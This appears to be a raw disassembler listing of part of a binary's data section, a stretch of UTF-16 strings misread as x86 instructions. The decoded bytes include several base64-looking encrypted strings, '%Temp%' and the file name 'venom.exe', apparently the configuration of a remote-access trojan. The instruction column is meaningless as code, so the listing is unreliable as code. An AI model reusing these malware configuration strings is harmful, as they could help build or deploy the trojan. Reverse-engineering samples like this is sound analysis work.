  4096cc:	39 00                	cmp    %eax,(%eax)
  4096ce:	39 00                	cmp    %eax,(%eax)
  4096d0:	6b 00 77             	imul   $0x77,(%eax),%eax
  4096d3:	00 47 00             	add    %al,0x0(%edi)
  4096d6:	51                   	push   %ecx
  4096d7:	00 7a 00             	add    %bh,0x0(%edx)
  4096da:	75 00                	jne    0x4096dc
  4096dc:	4d                   	dec    %ebp
  4096dd:	00 4f 00             	add    %cl,0x0(%edi)
  4096e0:	57                   	push   %edi
  4096e1:	00 48 00             	add    %cl,0x0(%eax)
  4096e4:	37                   	aaa
  4096e5:	00 30                	add    %dh,(%eax)
  4096e7:	00 57 00             	add    %dl,0x0(%edi)
  4096ea:	42                   	inc    %edx
  4096eb:	00 38                	add    %bh,(%eax)
  4096ed:	00 61 00             	add    %ah,0x0(%ecx)
  4096f0:	36 00 75 00          	add    %dh,%ss:0x0(%ebp)
  4096f4:	39 00                	cmp    %eax,(%eax)
  4096f6:	44                   	inc    %esp
  4096f7:	00 51 00             	add    %dl,0x0(%ecx)
  4096fa:	33 00                	xor    (%eax),%eax
  4096fc:	71 00                	jno    0x4096fe
  4096fe:	53                   	push   %ebx
  4096ff:	00 59 00             	add    %bl,0x0(%ecx)
  409702:	52                   	push   %edx
  409703:	00 48 00             	add    %cl,0x0(%eax)
  409706:	37                   	aaa
  409707:	00 43 00             	add    %al,0x0(%ebx)
  40970a:	75 00                	jne    0x40970c
  40970c:	6c                   	insb   (%dx),%es:(%edi)
  40970d:	00 63 00             	add    %ah,0x0(%ebx)
  409710:	5a                   	pop    %edx
  409711:	00 46 00             	add    %al,0x0(%esi)
  409714:	36 00 71 00          	add    %dh,%ss:0x0(%ecx)
  409718:	2b 00                	sub    (%eax),%eax
  40971a:	45                   	inc    %ebp
  40971b:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
  40971f:	00 42 00             	add    %al,0x0(%edx)
  409722:	34 00                	xor    $0x0,%al
  409724:	42                   	inc    %edx
  409725:	00 39                	add    %bh,(%ecx)
  409727:	00 79 00             	add    %bh,0x0(%ecx)
  40972a:	35 00 6a 00 4b       	xor    $0x4b006a00,%eax
  40972f:	00 51 00             	add    %dl,0x0(%ecx)
  409732:	4a                   	dec    %edx
  409733:	00 57 00             	add    %dl,0x0(%edi)
  409736:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  40973a:	43                   	inc    %ebx
  40973b:	00 41 00             	add    %al,0x0(%ecx)
  40973e:	47                   	inc    %edi
  40973f:	00 44 00 77          	add    %al,0x77(%eax,%eax,1)
  409743:	00 51 00             	add    %dl,0x0(%ecx)
  409746:	77 00                	ja     0x409748
  409748:	42                   	inc    %edx
  409749:	00 51 00             	add    %dl,0x0(%ecx)
  40974c:	64 00 4c 00 56       	add    %cl,%fs:0x56(%eax,%eax,1)
  409751:	00 69 00             	add    %ch,0x0(%ecx)
  409754:	2b 00                	sub    (%eax),%eax
  409756:	6b 00 78             	imul   $0x78,(%eax),%eax
  409759:	00 7a 00             	add    %bh,0x0(%edx)
  40975c:	57                   	push   %edi
  40975d:	00 31                	add    %dh,(%ecx)
  40975f:	00 37                	add    %dh,(%edi)
  409761:	00 59 00             	add    %bl,0x0(%ecx)
  409764:	75 00                	jne    0x409766
  409766:	52                   	push   %edx
  409767:	00 64 00 39          	add    %ah,0x39(%eax,%eax,1)
  40976b:	00 67 00             	add    %ah,0x0(%edi)
  40976e:	42                   	inc    %edx
  40976f:	00 4f 00             	add    %cl,0x0(%edi)
  409772:	69 00 48 00 75 00    	imul   $0x750048,(%eax),%eax
  409778:	42                   	inc    %edx
  409779:	00 33                	add    %dh,(%ebx)
  40977b:	00 45 00             	add    %al,0x0(%ebp)
  40977e:	36 00 74 00 6c       	add    %dh,%ss:0x6c(%eax,%eax,1)
  409783:	00 4d 00             	add    %cl,0x0(%ebp)
  409786:	4c                   	dec    %esp
  409787:	00 77 00             	add    %dh,0x0(%edi)
  40978a:	49                   	dec    %ecx
  40978b:	00 4b 00             	add    %cl,0x0(%ebx)
  40978e:	33 00                	xor    (%eax),%eax
  409790:	71 00                	jno    0x409792
  409792:	64 00 63 00          	add    %ah,%fs:0x0(%ebx)
  409796:	37                   	aaa
  409797:	00 74 00 2f          	add    %dh,0x2f(%eax,%eax,1)
  40979b:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
  40979f:	00 49 00             	add    %cl,0x0(%ecx)
  4097a2:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  4097a7:	64 00 67 00          	add    %ah,%fs:0x0(%edi)
  4097ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4097ac:	00 69 00             	add    %ch,0x0(%ecx)
  4097af:	2b 00                	sub    (%eax),%eax
  4097b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4097b2:	00 37                	add    %dh,(%edi)
  4097b4:	00 76 00             	add    %dh,0x0(%esi)
  4097b7:	59                   	pop    %ecx
  4097b8:	00 69 00             	add    %ch,0x0(%ecx)
  4097bb:	31 00                	xor    %eax,(%eax)
  4097bd:	32 00                	xor    (%eax),%al
  4097bf:	34 00                	xor    $0x0,%al
  4097c1:	35 00 63 00 48       	xor    $0x48006300,%eax
  4097c6:	00 49 00             	add    %cl,0x0(%ecx)
  4097c9:	79 00                	jns    0x4097cb
  4097cb:	6d                   	insl   (%dx),%es:(%edi)
  4097cc:	00 2f                	add    %ch,(%edi)
  4097ce:	00 6d 00             	add    %ch,0x0(%ebp)
  4097d1:	31 00                	xor    %eax,(%eax)
  4097d3:	5a                   	pop    %edx
  4097d4:	00 58 00             	add    %bl,0x0(%eax)
  4097d7:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4097db:	36 00 6c 00 77       	add    %ch,%ss:0x77(%eax,%eax,1)
  4097e0:	00 71 00             	add    %dh,0x0(%ecx)
  4097e3:	62 00                	bound  %eax,(%eax)
  4097e5:	43                   	inc    %ebx
  4097e6:	00 2b                	add    %ch,(%ebx)
  4097e8:	00 62 00             	add    %ah,0x0(%edx)
  4097eb:	48                   	dec    %eax
  4097ec:	00 56 00             	add    %dl,0x0(%esi)
  4097ef:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
  4097f3:	6a 00                	push   $0x0
  4097f5:	35 00 31 00 30       	xor    $0x30003100,%eax
  4097fa:	00 72 00             	add    %dh,0x0(%edx)
  4097fd:	73 00                	jae    0x4097ff
  4097ff:	51                   	push   %ecx
  409800:	00 65 00             	add    %ah,0x0(%ebp)
  409803:	73 00                	jae    0x409805
  409805:	52                   	push   %edx
  409806:	00 73 00             	add    %dh,0x0(%ebx)
  409809:	46                   	inc    %esi
  40980a:	00 42 00             	add    %al,0x0(%edx)
  40980d:	4d                   	dec    %ebp
  40980e:	00 7a 00             	add    %bh,0x0(%edx)
  409811:	51                   	push   %ecx
  409812:	00 6a 00             	add    %ch,0x0(%edx)
  409815:	42                   	inc    %edx
  409816:	00 58 00             	add    %bl,0x0(%eax)
  409819:	79 00                	jns    0x40981b
  40981b:	73 00                	jae    0x40981d
  40981d:	6f                   	outsl  %ds:(%esi),(%dx)
  40981e:	00 77 00             	add    %dh,0x0(%edi)
  409821:	67 00 4f 00          	add    %cl,0x0(%bx)
  409825:	74 00                	je     0x409827
  409827:	37                   	aaa
  409828:	00 52 00             	add    %dl,0x0(%edx)
  40982b:	67 00 39             	add    %bh,(%bx,%di)
  40982e:	00 2f                	add    %ch,(%edi)
  409830:	00 56 00             	add    %dl,0x0(%esi)
  409833:	39 00                	cmp    %eax,(%eax)
  409835:	34 00                	xor    $0x0,%al
  409837:	2f                   	das
  409838:	00 43 00             	add    %al,0x0(%ebx)
  40983b:	64 00 33             	add    %dh,%fs:(%ebx)
  40983e:	00 54 00 43          	add    %dl,0x43(%eax,%eax,1)
  409842:	00 48 00             	add    %cl,0x0(%eax)
  409845:	61                   	popa
  409846:	00 45 00             	add    %al,0x0(%ebp)
  409849:	37                   	aaa
  40984a:	00 4e 00             	add    %cl,0x0(%esi)
  40984d:	66 00 37             	data16 add %dh,(%edi)
  409850:	00 67 00             	add    %ah,0x0(%edi)
  409853:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409858:	80 b1 46 00 42 00 77 	xorb   $0x77,0x420046(%ecx)
  40985f:	00 57 00             	add    %dl,0x0(%edi)
  409862:	71 00                	jno    0x409864
  409864:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409868:	31 00                	xor    %eax,(%eax)
  40986a:	73 00                	jae    0x40986c
  40986c:	51                   	push   %ecx
  40986d:	00 79 00             	add    %bh,0x0(%ecx)
  409870:	56                   	push   %esi
  409871:	00 78 00             	add    %bh,0x0(%eax)
  409874:	7a 00                	jp     0x409876
  409876:	6c                   	insb   (%dx),%es:(%edi)
  409877:	00 2b                	add    %ch,(%ebx)
  409879:	00 47 00             	add    %al,0x0(%edi)
  40987c:	2b 00                	sub    (%eax),%eax
  40987e:	5a                   	pop    %edx
  40987f:	00 6f 00             	add    %ch,0x0(%edi)
  409882:	5a                   	pop    %edx
  409883:	00 65 00             	add    %ah,0x0(%ebp)
  409886:	43                   	inc    %ebx
  409887:	00 73 00             	add    %dh,0x0(%ebx)
  40988a:	51                   	push   %ecx
  40988b:	00 73 00             	add    %dh,0x0(%ebx)
  40988e:	49                   	dec    %ecx
  40988f:	00 31                	add    %dh,(%ecx)
  409891:	00 48 00             	add    %cl,0x0(%eax)
  409894:	67 00 54 00          	add    %dl,0x0(%si)
  409898:	58                   	pop    %eax
  409899:	00 6b 00             	add    %ch,0x0(%ebx)
  40989c:	6c                   	insb   (%dx),%es:(%edi)
  40989d:	00 57 00             	add    %dl,0x0(%edi)
  4098a0:	5a                   	pop    %edx
  4098a1:	00 58 00             	add    %bl,0x0(%eax)
  4098a4:	56                   	push   %esi
  4098a5:	00 51 00             	add    %dl,0x0(%ecx)
  4098a8:	73 00                	jae    0x4098aa
  4098aa:	75 00                	jne    0x4098ac
  4098ac:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  4098b0:	77 00                	ja     0x4098b2
  4098b2:	7a 00                	jp     0x4098b4
  4098b4:	51                   	push   %ecx
  4098b5:	00 78 00             	add    %bh,0x0(%eax)
  4098b8:	32 00                	xor    (%eax),%al
  4098ba:	32 00                	xor    (%eax),%al
  4098bc:	71 00                	jno    0x4098be
  4098be:	44                   	inc    %esp
  4098bf:	00 4c 00 79          	add    %cl,0x79(%eax,%eax,1)
  4098c3:	00 65 00             	add    %ah,0x0(%ebp)
  4098c6:	47                   	inc    %edi
  4098c7:	00 2b                	add    %ch,(%ebx)
  4098c9:	00 49 00             	add    %cl,0x0(%ecx)
  4098cc:	78 00                	js     0x4098ce
  4098ce:	64 00 44 00 49       	add    %al,%fs:0x49(%eax,%eax,1)
  4098d3:	00 36                	add    %dh,(%esi)
  4098d5:	00 74 00 63          	add    %dh,0x63(%eax,%eax,1)
  4098d9:	00 43 00             	add    %al,0x0(%ebx)
  4098dc:	6d                   	insl   (%dx),%es:(%edi)
  4098dd:	00 50 00             	add    %dl,0x0(%eax)
  4098e0:	6c                   	insb   (%dx),%es:(%edi)
  4098e1:	00 54 00 34          	add    %dl,0x34(%eax,%eax,1)
  4098e5:	00 67 00             	add    %ah,0x0(%edi)
  4098e8:	4e                   	dec    %esi
  4098e9:	00 4e 00             	add    %cl,0x0(%esi)
  4098ec:	5a                   	pop    %edx
  4098ed:	00 41 00             	add    %al,0x0(%ecx)
  4098f0:	49                   	dec    %ecx
  4098f1:	00 67 00             	add    %ah,0x0(%edi)
  4098f4:	36 00 74 00 4e       	add    %dh,%ss:0x4e(%eax,%eax,1)
  4098f9:	00 67 00             	add    %ah,0x0(%edi)
  4098fc:	71 00                	jno    0x4098fe
  4098fe:	48                   	dec    %eax
  4098ff:	00 73 00             	add    %dh,0x0(%ebx)
  409902:	6d                   	insl   (%dx),%es:(%edi)
  409903:	00 51 00             	add    %dl,0x0(%ecx)
  409906:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40990b:	0d 25 00 54 00       	or     $0x540025,%eax
  409910:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409914:	70 00                	jo     0x409916
  409916:	25 00 00 13 76       	and    $0x76130000,%eax
  40991b:	00 65 00             	add    %ah,0x0(%ebp)
  40991e:	6e                   	outsb  %ds:(%esi),(%dx)
  40991f:	00 6f 00             	add    %ch,0x0(%edi)
  409922:	6d                   	insl   (%dx),%es:(%edi)
  409923:	00 2e                	add    %ch,(%esi)
  409925:	00 65 00             	add    %ah,0x0(%ebp)
  409928:	78 00                	js     0x40992a
  40992a:	65 00 00             	add    %al,%gs:(%eax)
  40992d:	59                   	pop    %ecx
  40992e:	4d                   	dec    %ebp
  40992f:	00 6a 00             	add    %ch,0x0(%edx)
  409932:	56                   	push   %esi
  409933:	00 70 00             	add    %dh,0x0(%eax)
  409936:	4d                   	dec    %ebp
  409937:	00 55 00             	add    %dl,0x0(%ebp)
  40993a:	6c                   	insb   (%dx),%es:(%edi)
  40993b:	00 6a 00             	add    %ch,0x0(%edx)
  40993e:	56                   	push   %esi
  40993f:	00 33                	add    %dh,(%ebx)
  409941:	00 42 00             	add    %al,0x0(%edx)
  409944:	48                   	dec    %eax
  409945:	00 57 00             	add    %dl,0x0(%edi)
  409948:	45                   	inc    %ebp
  409949:	00 4a 00             	add    %cl,0x0(%edx)
  40994c:	4c                   	dec    %esp
  40994d:	00 5a 00             	add    %bl,0x0(%edx)
  409950:	6a 00                	push   $0x0
  409952:	68 00 6c 00 5a       	push   $0x5a006c00
  409957:	00 6d 00             	add    %ch,0x0(%ebp)
  40995a:	4e                   	dec    %esi
  40995b:	00 47 00             	add    %al,0x0(%edi)
  40995e:	65 00 47 00          	add    %al,%gs:0x0(%edi)
  409962:	70 00                	jo     0x409964
  409964:	57                   	push   %edi
  409965:	00 4e 00             	add    %cl,0x0(%esi)
  409968:	6d                   	insl   (%dx),%es:(%edi)
  409969:	00 39                	add    %bh,(%ecx)
  40996b:	00 42 00             	add    %al,0x0(%edx)
  40996e:	51                   	push   %ecx
  40996f:	00 31                	add    %dh,(%ecx)
  409971:	00 56 00             	add    %dl,0x0(%esi)
  409974:	54                   	push   %esp
  409975:	00 53 00             	add    %dl,0x0(%ebx)
  409978:	30 00                	xor    %al,(%eax)
  40997a:	46                   	inc    %esi
  40997b:	00 6b 00             	add    %ch,0x0(%ebx)
  40997e:	59                   	pop    %ecx
  40997f:	00 56 00             	add    %dl,0x0(%esi)
  409982:	55                   	push   %ebp
  409983:	00 3d 00 00 80 d9    	add    %bh,0xd9800000
  409989:	66 00 36             	data16 add %dh,(%esi)
  40998c:	00 37                	add    %dh,(%edi)
  40998e:	00 68 00             	add    %ch,0x0(%eax)
  409991:	72 00                	jb     0x409993
  409993:	38 00                	cmp    %al,(%eax)
  409995:	67 00 75 00          	add    %dh,0x0(%di)
  409999:	72 00                	jb     0x40999b
  40999b:	6a 00                	push   $0x0
  40999d:	77 00                	ja     0x40999f
  40999f:	55                   	push   %ebp
  4099a0:	00 5a 00             	add    %bl,0x0(%edx)
  4099a3:	49                   	dec    %ecx
  4099a4:	00 62 00             	add    %ah,0x0(%edx)
  4099a7:	59                   	pop    %ecx
  4099a8:	00 47 00             	add    %al,0x0(%edi)
  4099ab:	35 00 51 00 4f       	xor    $0x4f005100,%eax
  4099b0:	00 46 00             	add    %al,0x0(%esi)
  4099b3:	32 00                	xor    (%eax),%al
  4099b5:	6c                   	insb   (%dx),%es:(%edi)
  4099b6:	00 59 00             	add    %bl,0x0(%ecx)
  4099b9:	71 00                	jno    0x4099bb
  4099bb:	37                   	aaa
  4099bc:	00 61 00             	add    %ah,0x0(%ecx)
  4099bf:	34 00                	xor    $0x0,%al
  4099c1:	55                   	push   %ebp
  4099c2:	00 4b 00             	add    %cl,0x0(%ebx)
  4099c5:	4e                   	dec    %esi
  4099c6:	00 54 00 43          	add    %dl,0x43(%eax,%eax,1)
  4099ca:	00 35 00 78 00 31    	add    %dh,0x31007800
  4099d0:	00 63 00             	add    %ah,0x0(%ebx)
  4099d3:	4b                   	dec    %ebx
  4099d4:	00 65 00             	add    %ah,0x0(%ebp)
  4099d7:	44                   	inc    %esp
  4099d8:	00 75 00             	add    %dh,0x0(%ebp)
  4099db:	75 00                	jne    0x4099dd
  4099dd:	54                   	push   %esp
  4099de:	00 43 00             	add    %al,0x0(%ebx)
  4099e1:	6a 00                	push   $0x0
  4099e3:	69 00 55 00 6d 00    	imul   $0x6d0055,(%eax),%eax
  4099e9:	78 00                	js     0x4099eb
  4099eb:	39 00                	cmp    %eax,(%eax)
  4099ed:	39 00                	cmp    %eax,(%eax)
  4099ef:	2b 00                	sub    (%eax),%eax
  4099f1:	61                   	popa
  4099f2:	00 6d 00             	add    %ch,0x0(%ebp)
  4099f5:	79 00                	jns    0x4099f7
  4099f7:	32 00                	xor    (%eax),%al
  4099f9:	36 00 55 00          	add    %dl,%ss:0x0(%ebp)
  4099fd:	79 00                	jns    0x4099ff
  4099ff:	31 00                	xor    %eax,(%eax)
  409a01:	5a                   	pop    %edx
  409a02:	00 4a 00             	add    %cl,0x0(%edx)
  409a05:	5a                   	pop    %edx
  409a06:	00 44 00 49          	add    %al,0x49(%eax,%eax,1)
  409a0a:	00 6d 00             	add    %ch,0x0(%ebp)
  409a0d:	30 00                	xor    %al,(%eax)
  409a0f:	36 00 41 00          	add    %al,%ss:0x0(%ecx)
  409a13:	4b                   	dec    %ebx
  409a14:	00 31                	add    %dh,(%ecx)
  409a16:	00 58 00             	add    %bl,0x0(%eax)
  409a19:	73 00                	jae    0x409a1b
  409a1b:	54                   	push   %esp
  409a1c:	00 64 00 67          	add    %ah,0x67(%eax,%eax,1)
  409a20:	00 6b 00             	add    %ch,0x0(%ebx)
  409a23:	4a                   	dec    %edx
  409a24:	00 50 00             	add    %dl,0x0(%eax)
  409a27:	65 00 4a 00          	add    %cl,%gs:0x0(%edx)
  409a2b:	39 00                	cmp    %eax,(%eax)
  409a2d:	6c                   	insb   (%dx),%es:(%edi)
  409a2e:	00 45 00             	add    %al,0x0(%ebp)
  409a31:	44                   	inc    %esp
  409a32:	00 65 00             	add    %ah,0x0(%ebp)
  409a35:	42                   	inc    %edx
  409a36:	00 33                	add    %dh,(%ebx)
  409a38:	00 74 00 42          	add    %dh,0x42(%eax,%eax,1)
  409a3c:	00 59 00             	add    %bl,0x0(%ecx)
  409a3f:	77 00                	ja     0x409a41
  409a41:	6a 00                	push   $0x0
  409a43:	54                   	push   %esp
  409a44:	00 74 00 57          	add    %dh,0x57(%eax,%eax,1)
  409a48:	00 51 00             	add    %dl,0x0(%ecx)
  409a4b:	62 00                	bound  %eax,(%eax)
  409a4d:	72 00                	jb     0x409a4f
  409a4f:	68 00 42 00 77       	push   $0x77004200
  409a54:	00 37                	add    %dh,(%edi)
  409a56:	00 55 00             	add    %dl,0x0(%ebp)
  409a59:	4b                   	dec    %ebx
  409a5a:	00 49 00             	add    %cl,0x0(%ecx)
  409a5d:	4d                   	dec    %ebp
  409a5e:	00 3d 00 00 92 59    	add    %bh,0x59920000
  409a64:	6e                   	outsb  %ds:(%esi),(%dx)
  409a65:	00 49 00             	add    %cl,0x0(%ecx)
  409a68:	35 00 67 00 6f       	xor    $0x6f006700,%eax
  409a6d:	00 71 00             	add    %dh,0x0(%ecx)
  409a70:	32 00                	xor    (%eax),%al
  409a72:	71 00                	jno    0x409a74
  409a74:	75 00                	jne    0x409a76
  409a76:	32 00                	xor    (%eax),%al
  409a78:	32 00                	xor    (%eax),%al
  409a7a:	65 00 37             	add    %dh,%gs:(%edi)
  409a7d:	00 49 00             	add    %cl,0x0(%ecx)
  409a80:	4a                   	dec    %edx
  409a81:	00 35 00 65 00 52    	add    %dh,0x52006500
  409a87:	00 42 00             	add    %al,0x0(%edx)
  409a8a:	68 00 7a 00 43       	push   $0x43007a00
  409a8f:	00 50 00             	add    %dl,0x0(%eax)
  409a92:	58                   	pop    %eax
  409a93:	00 71 00             	add    %dh,0x0(%ecx)
  409a96:	62 00                	bound  %eax,(%eax)
  409a98:	55                   	push   %ebp
  409a99:	00 37                	add    %dh,(%edi)
  409a9b:	00 6f 00             	add    %ch,0x0(%edi)
  409a9e:	69 00 2f 00 33 00    	imul   $0x33002f,(%eax),%eax
  409aa4:	77 00                	ja     0x409aa6
  409aa6:	43                   	inc    %ebx
  409aa7:	00 34 00             	add    %dh,(%eax,%eax,1)
  409aaa:	73 00                	jae    0x409aac
  409aac:	70 00                	jo     0x409aae
  409aae:	42                   	inc    %edx
  409aaf:	00 71 00             	add    %dh,0x0(%ecx)
  409ab2:	57                   	push   %edi
  409ab3:	00 71 00             	add    %dh,0x0(%ecx)
  409ab6:	6e                   	outsb  %ds:(%esi),(%dx)
  409ab7:	00 57 00             	add    %dl,0x0(%edi)
  409aba:	43                   	inc    %ebx
  409abb:	00 4b 00             	add    %cl,0x0(%ebx)
  409abe:	4f                   	dec    %edi
  409abf:	00 43 00             	add    %al,0x0(%ebx)
  409ac2:	48                   	dec    %eax
  409ac3:	00 66 00             	add    %ah,0x0(%esi)
  409ac6:	34 00                	xor    $0x0,%al
  409ac8:	5a                   	pop    %edx
  409ac9:	00 63 00             	add    %ah,0x0(%ebx)
  409acc:	35 00 36 00 39       	xor    $0x39003600,%eax
  409ad1:	00 58 00             	add    %bl,0x0(%eax)
  409ad4:	6b 00 79             	imul   $0x79,(%eax),%eax
  409ad7:	00 44 00 79          	add    %al,0x79(%eax,%eax,1)
  409adb:	00 52 00             	add    %dl,0x0(%edx)
  409ade:	59                   	pop    %ecx
  409adf:	00 38                	add    %bh,(%eax)
  409ae1:	00 63 00             	add    %ah,0x0(%ebx)
  409ae4:	4c                   	dec    %esp
  409ae5:	00 67 00             	add    %ah,0x0(%edi)
  409ae8:	79 00                	jns    0x409aea
  409aea:	68 00 52 00 51       	push   $0x51005200
  409aef:	00 52 00             	add    %dl,0x0(%edx)
  409af2:	46                   	inc    %esi
  409af3:	00 6d 00             	add    %ch,0x0(%ebp)
  409af6:	43                   	inc    %ebx
  409af7:	00 4a 00             	add    %cl,0x0(%edx)
  409afa:	68 00 4c 00 35       	push   $0x35004c00
  409aff:	00 4f 00             	add    %cl,0x0(%edi)
  409b02:	43                   	inc    %ebx
  409b03:	00 41 00             	add    %al,0x0(%ecx)
  409b06:	41                   	inc    %ecx
  409b07:	00 36                	add    %dh,(%esi)
  409b09:	00 2b                	add    %ch,(%ebx)
  409b0b:	00 59 00             	add    %bl,0x0(%ecx)
  409b0e:	35 00 68 00 4d       	xor    $0x4d006800,%eax
  409b13:	00 70 00             	add    %dh,0x0(%eax)
  409b16:	6b 00 57             	imul   $0x57,(%eax),%eax
  409b19:	00 61 00             	add    %ah,0x0(%ecx)
  409b1c:	38 00                	cmp    %al,(%eax)
  409b1e:	50                   	push   %eax
  409b1f:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
  409b23:	00 36                	add    %dh,(%esi)
  409b25:	00 2b                	add    %ch,(%ebx)
  409b27:	00 66 00             	add    %ah,0x0(%esi)
  409b2a:	37                   	aaa
  409b2b:	00 78 00             	add    %bh,0x0(%eax)
  409b2e:	47                   	inc    %edi
  409b2f:	00 50 00             	add    %dl,0x0(%eax)
  409b32:	37                   	aaa
  409b33:	00 55 00             	add    %dl,0x0(%ebp)
  409b36:	6c                   	insb   (%dx),%es:(%edi)
  409b37:	00 55 00             	add    %dl,0x0(%ebp)
  409b3a:	32 00                	xor    (%eax),%al
  409b3c:	31 00                	xor    %eax,(%eax)
  409b3e:	6e                   	outsb  %ds:(%esi),(%dx)
  409b3f:	00 52 00             	add    %dl,0x0(%edx)
  409b42:	45                   	inc    %ebp
  409b43:	00 65 00             	add    %ah,0x0(%ebp)
  409b46:	67 00 58 00          	add    %bl,0x0(%bx,%si)
  409b4a:	71 00                	jno    0x409b4c
  409b4c:	77 00                	ja     0x409b4e
  409b4e:	42                   	inc    %edx
  409b4f:	00 38                	add    %bh,(%eax)
  409b51:	00 62 00             	add    %ah,0x0(%edx)
  409b54:	72 00                	jb     0x409b56
  409b56:	7a 00                	jp     0x409b58
  409b58:	58                   	pop    %eax
  409b59:	00 4d 00             	add    %cl,0x0(%ebp)
  409b5c:	76 00                	jbe    0x409b5e
  409b5e:	72 00                	jb     0x409b60
  409b60:	4a                   	dec    %edx
  409b61:	00 57 00             	add    %dl,0x0(%edi)
  409b64:	70 00                	jo     0x409b66
  409b66:	70 00                	jo     0x409b68
  409b68:	54                   	push   %esp
  409b69:	00 31                	add    %dh,(%ecx)
  409b6b:	00 75 00             	add    %dh,0x0(%ebp)
  409b6e:	30 00                	xor    %al,(%eax)
  409b70:	76 00                	jbe    0x409b72
  409b72:	49                   	dec    %ecx
  409b73:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  409b77:	00 43 00             	add    %al,0x0(%ebx)
  409b7a:	5a                   	pop    %edx
  409b7b:	00 65 00             	add    %ah,0x0(%ebp)
  409b7e:	72 00                	jb     0x409b80
  409b80:	4c                   	dec    %esp
  409b81:	00 44 00 78          	add    %al,0x78(%eax,%eax,1)
  409b85:	00 65 00             	add    %ah,0x0(%ebp)
  409b88:	57                   	push   %edi
  409b89:	00 45 00             	add    %al,0x0(%ebp)
  409b8c:	52                   	push   %edx
  409b8d:	00 59 00             	add    %bl,0x0(%ecx)
  409b90:	75 00                	jne    0x409b92
  409b92:	51                   	push   %ecx
  409b93:	00 64 00 48          	add    %ah,0x48(%eax,%eax,1)
  409b97:	00 38                	add    %bh,(%eax)
  409b99:	00 6f 00             	add    %ch,0x0(%edi)
  409b9c:	31 00                	xor    %eax,(%eax)
  409b9e:	4f                   	dec    %edi
  409b9f:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
  409ba3:	00 56 00             	add    %dl,0x0(%esi)
  409ba6:	4b                   	dec    %ebx
  409ba7:	00 65 00             	add    %ah,0x0(%ebp)
  409baa:	73 00                	jae    0x409bac
  409bac:	2f                   	das
  409bad:	00 66 00             	add    %ah,0x0(%esi)
  409bb0:	51                   	push   %ecx
  409bb1:	00 78 00             	add    %bh,0x0(%eax)
  409bb4:	7a 00                	jp     0x409bb6
  409bb6:	67 00 76 00          	add    %dh,0x0(%bp)
  409bba:	42                   	inc    %edx
  409bbb:	00 6a 00             	add    %ch,0x0(%edx)
  409bbe:	55                   	push   %ebp
  409bbf:	00 77 00             	add    %dh,0x0(%edi)
  409bc2:	78 00                	js     0x409bc4
  409bc4:	74 00                	je     0x409bc6
  409bc6:	79 00                	jns    0x409bc8
  409bc8:	79 00                	jns    0x409bca
  409bca:	57                   	push   %edi
  409bcb:	00 50 00             	add    %dl,0x0(%eax)
  409bce:	41                   	inc    %ecx
  409bcf:	00 73 00             	add    %dh,0x0(%ebx)
  409bd2:	56                   	push   %esi
  409bd3:	00 6e 00             	add    %ch,0x0(%esi)
  409bd6:	6b 00 31             	imul   $0x31,(%eax),%eax
  409bd9:	00 4e 00             	add    %cl,0x0(%esi)
  409bdc:	33 00                	xor    (%eax),%eax
  409bde:	79 00                	jns    0x409be0
  409be0:	61                   	popa
  409be1:	00 5a 00             	add    %bl,0x0(%edx)
  409be4:	44                   	inc    %esp
  409be5:	00 68 00             	add    %ch,0x0(%eax)
  409be8:	73 00                	jae    0x409bea
  409bea:	53                   	push   %ebx
  409beb:	00 42 00             	add    %al,0x0(%edx)
  409bee:	42                   	inc    %edx
  409bef:	00 68 00             	add    %ch,0x0(%eax)
  409bf2:	44                   	inc    %esp
  409bf3:	00 74 00 6a          	add    %dh,0x6a(%eax,%eax,1)
  409bf7:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  409bfb:	00 6f 00             	add    %ch,0x0(%edi)
  409bfe:	4c                   	dec    %esp
  409bff:	00 49 00             	add    %cl,0x0(%ecx)
  409c02:	72 00                	jb     0x409c04
  409c04:	4c                   	dec    %esp
  409c05:	00 6a 00             	add    %ch,0x0(%edx)
  409c08:	4d                   	dec    %ebp
  409c09:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
  409c0d:	00 38                	add    %bh,(%eax)
  409c0f:	00 70 00             	add    %dh,0x0(%eax)
  409c12:	56                   	push   %esi
  409c13:	00 50 00             	add    %dl,0x0(%eax)
  409c16:	30 00                	xor    %al,(%eax)
  409c18:	44                   	inc    %esp
  409c19:	00 64 00 70          	add    %ah,0x70(%eax,%eax,1)
  409c1d:	00 74 00 34          	add    %dh,0x34(%eax,%eax,1)
  409c21:	00 67 00             	add    %ah,0x0(%edi)
  409c24:	2f                   	das
  409c25:	00 4e 00             	add    %cl,0x0(%esi)
  409c28:	73 00                	jae    0x409c2a
  409c2a:	2f                   	das
  409c2b:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  409c2f:	00 4e 00             	add    %cl,0x0(%esi)
  409c32:	4f                   	dec    %edi
  409c33:	00 53 00             	add    %dl,0x0(%ebx)
  409c36:	42                   	inc    %edx
  409c37:	00 42 00             	add    %al,0x0(%edx)
  409c3a:	32 00                	xor    (%eax),%al
  409c3c:	73 00                	jae    0x409c3e
  409c3e:	77 00                	ja     0x409c40
  409c40:	7a 00                	jp     0x409c42
  409c42:	4c                   	dec    %esp
  409c43:	00 53 00             	add    %dl,0x0(%ebx)
  409c46:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  409c4a:	44                   	inc    %esp
  409c4b:	00 56 00             	add    %dl,0x0(%esi)
  409c4e:	55                   	push   %ebp
  409c4f:	00 5a 00             	add    %bl,0x0(%edx)
  409c52:	43                   	inc    %ebx
  409c53:	00 68 00             	add    %ch,0x0(%eax)
  409c56:	79 00                	jns    0x409c58
  409c58:	44                   	inc    %esp
  409c59:	00 38                	add    %bh,(%eax)
